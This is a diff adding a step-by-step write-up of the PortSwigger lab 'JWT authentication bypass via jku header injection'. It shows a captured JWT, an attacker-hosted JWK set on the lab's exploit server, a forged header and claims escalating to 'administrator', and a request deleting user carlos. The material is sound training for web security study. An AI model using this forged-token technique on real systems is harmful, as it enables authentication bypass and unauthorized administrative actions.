@@ -744,7 +744,86 @@ eyJraWQiOiJiZjFhOTg1Zi00NDgwLTQ1MmQtODQzZS0wMjIyMGUzZTg2YmYiLCJhbGciOiJSUzI1NiJ9
 
 
 <details>
-    <summary></summary>
+    <summary>Lab: JWT authentication bypass via jku header injection</summary>
+
+```
+eyJraWQiOiJjZmRmYTMyMS00YWZiLTRiZDUtODVlMS1lOTc1ODE3OGM3MTkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjUxMDAzOSwic3ViIjoid2llbmVyIn0.s_HN8Ym6FyTityp_B97oktH_TDGl0asia1ZBLgOue250fh60YvGcsof55XD7UXBsrodedGLLL_ou60RKuneFFCHFH6LmoGaoDec-866Bgfn7FJNcEuv7gK6Ao6UD0KI-MomyiLC9aA2UJ4N1quA2H_FQjSYj3atSUgETRuQW6VROKuFEEfguFpe4Yn9SOxQbH4gBdHZi_u4oAl1NOwmI3x5RUTw90b9W6FvA3DJUeGUdIsE2RSejEqcgIhP3bjkP4mlh9_Q0m5J7DLpYGXB5_MAjcy064xGNTBMji3yHaIup0tBhcvmNCsZ7M8h9wysUaraRdWCq4LIVEv6wbPkbFA
+```
+
+<img width="748" height="718" alt="image" src="https://github.com/user-attachments/assets/3602e8cc-d8b6-4806-96ef-8a1cebb3ef8c" />
+
+----
+
+> ## first we need to create new **`RSA key`** :
+
+<img width="1022" height="566" alt="image" src="https://github.com/user-attachments/assets/4ae83bd0-a868-45e9-9483-ae9c0bf6f933" />
+
+> ## now do **`copy public key as jwk`** and put it on exploit server and click ``store``
+
+<img width="629" height="258" alt="image" src="https://github.com/user-attachments/assets/2d7ac00d-d32b-41f5-ba7f-34877dd31b88" />
+
+<img width="1335" height="375" alt="image" src="https://github.com/user-attachments/assets/fdfb45fa-4583-4b3a-b8b2-b58cd1edeaff" />
+
+```json
+{
+    "keys": [
+        {
+    "kty": "RSA",
+    "e": "AQAB",
+    "kid": "4a39d446-dd24-4c7e-86b8-183a1ac079a0",
+    "n": "tb58PeMrMiHDWHPlUgrCVJjiq0oR44e8DN5K0lyJR0pA0qpctF_3_vubDlUL7pkrviNdEeJuVRrvB5nJmGi_q78ahHm-4Ik6eH9r7KFhM22ki4VZFH-kvWMpCBAv_4P8-4Z21ZPhUjxFHAA_PxF0_WawIxgXpNcxm9n_bry2f2zjQg4NX8cA_-WxTR71n9B8BNWbSkcVk6jcmjhj9Q-N1dYbBi1kLjtWH1qqf08icrD5CQ1hV0gGc5x0gOk_6wNAT5pf1u6krvVnkzSHSkwyUAhV9fqjk7-KEfPJ2JCpIudj5WuJh-52m-Sf5fUc3owfpV_w8K-FBJmTDs_K2wg5OQ"
+}
+    ]
+}
+```
+
+> ## now take the `"kid"` and `exploit server url`
+
+```
+4a39d446-dd24-4c7e-86b8-183a1ac079a0
+```
+
+```
+https://exploit-0a1d00cb047f301a8160c9ac01d800dd.exploit-server.net/exploit
+```
+
+----
+
+> ## change the header in burp suite:
+> 1. put the new **`"kid"`**
+> 2. set a new key **`"jku"`** with exploite server url
+> 3. change user to **`administrator`**
+
+<img width="809" height="695" alt="image" src="https://github.com/user-attachments/assets/10e4f9a0-7568-48eb-8373-3c23fa5170a8" />
+
+```json
+{
+    "kid": "4a39d446-dd24-4c7e-86b8-183a1ac079a0",
+    "alg": "RS256",
+    "jku": "https://exploit-0a1d00cb047f301a8160c9ac01d800dd.exploit-server.net/exploit"
+}
+```
+
+```json
+{
+    "iss": "portswigger",
+    "exp": 1756510039,
+    "sub": "administrator"
+}
+```
+
+
+> click **`sign`** and send the request
+
+
+
+<img width="1594" height="785" alt="image" src="https://github.com/user-attachments/assets/22276224-fe3a-4826-a350-da9a9c154296" />
+
+> change path to **`GET /admin/delete?username=carlos HTTP/2`**
+
+<img width="1521" height="758" alt="image" src="https://github.com/user-attachments/assets/73a69ba9-8e3e-4b91-8916-354155a84fbe" />
+
+    
 </details>
 
 
